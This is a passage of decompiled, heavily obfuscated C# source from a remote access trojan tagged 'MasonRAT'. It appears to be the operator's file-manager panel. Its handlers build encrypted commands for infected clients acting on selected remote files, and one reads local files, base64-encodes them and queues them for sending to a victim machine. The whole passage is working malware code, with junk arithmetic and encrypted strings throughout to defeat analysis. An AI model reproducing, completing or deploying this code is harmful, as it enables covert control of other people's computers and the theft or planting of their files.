              strArray[~214409058 - 1933242533 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 - (1516441056 - (651507323 << 20995536) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 | (-859738771 ^ ~1340864611) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = Left;
              Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
              Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
            }
          }
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ـ\u060Aــۜـ\u060Aٺـ\u0609ٸ\u060Dٽ\u060Aٻــ(
    object sender,
    EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        int imageIndex = selectedItem.ImageIndex;
        if (imageIndex < 0 || imageIndex > 1)
        {
          if (imageIndex == (1352798649 + (1297941970 << 1168933978) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 ^ ~(1962529464 + -228320372 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0))
          {
            string[] strArray = new string[(-720203760 - (1423331414 << 2101870721) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 ^ 727906393 + (795908262 >> 670017004) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 << (-1675832931 - 1382279133 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1];
            strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 370);
            strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
            strArray[((-1691387681 ^ 2065929246 << 1556178586) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + (-1135705317 - ~1619133447 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) % (276964473 + 1481361727 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 371);
            strArray[(1074770634 + ~1074770622 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 ^ (1152156674 ^ 1152156682 << 995599840) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
            strArray[(1572531621 > 186384937 ? -1473462902 : -1964617202) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 - ~((682374435 ^ (1600533336 | 2115728986)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
            strArray[((68437679 << 621560287) - 890728802 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + -((-1993358856 ^ ~1010348190) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0] = selectedItem.Text;
            Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
          else
          {
            string[] strArray = new string[(-392119641 - -86807157 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ^ ~(305312484 + (325376387 >> 1107958172) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)];
            strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 372);
            strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
            strArray[-110549070 - 2036934576 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 + (1769662310 + 163336444 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 << ((456735114 ^ 1809940481 % 1424553261) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 373);
            strArray[((-1626171730 - (456794383 | 1446276156) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) > 1756989662 + (1470215551 >> 1673602374) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 ? 724109038 - 724109034 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 : 519587633 + -519587630 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
            strArray[((421611014 > 302569386 ? -971627300 : -1295503066) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + ((979705994 ^ 59571106 % 750388204) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) % (424853884 - ~1202898607 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
            strArray[(-1312349912 - (30543621 | 201767716) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + (1544527370 - (1176333642 >> 1178436795) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = selectedItem.Text;
            Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڟ\u0609̨ـ\u060Dــڙۡـ\u0020ڦـ(object sender, EventArgs e)
  {
    OpenFileDialog openFileDialog1 = new OpenFileDialog();
    openFileDialog1.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 374);
    openFileDialog1.Multiselect = true;
    OpenFileDialog openFileDialog2 = openFileDialog1;
    if (openFileDialog2.ShowDialog() != DialogResult.OK)
      return;
    string[] fileNames = openFileDialog2.FileNames;
    int num = checked (fileNames.Length - 1);
    int index = 0;
    while (index <= num)
    {
      string[] strArray = new string[(977185962 - 976772451 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 ^ -285549472 - -1132407986 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 >> ((1785272692 | 1385535764) - 1177966473 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 375);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(1662914318 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 - (~1761297715 - 870755270 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
      strArray[(800982204 + -666764473 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + (1826051902 - 215989503 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 << ((1698421324 > 1773524358 ? 436006478 : 327004859) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0] = Path.GetFileName(fileNames[index]);
      strArray[(853525412 - 1904518217 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 ^ -(-1116041188 - (2123473747 | 851782777) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(565978000 - 565977980 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 ^ 682138024 % 405978591 - 276159416 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = Convert.ToBase64String(File.ReadAllBytes(fileNames[index]));
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      checked { ++index; }
    }
  }

  private void \u2694️MasonRAT\u270C\u060Dٸ\u060Aــ\u060Aئ\u060B̍ڙط\u060C\u060Bڠ(
    object sender,
    EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        string[] strArray = new string[(-957678918 - 1191951599 % 1383842612 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 ^ ((1453275591 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 | (-1609773763 ^ ~580920910) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 376);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(1093664782 + (2029190125 << 1265551220) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 ^ 900565937 - 900565925 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[((1562758519 > 1339099247 ? 19 : 25) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 ^ 1178599440 + (294290894 << 1797650389) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = selectedItem.Text;
        strArray[(((-1127098117 ^ 1986522710 << 1785750538) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) > -1469820109 - -1819695280 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 ? 208905470 - 208905466 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 : 3047009 - (780033027 >> 2103130728) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(1655226296 - 1655198613 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ^ (49105697 > 257468132 ? -1875727510 : 1814429840) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 >> 1407701111 - 1047541159 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = selectedItem.Text;
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
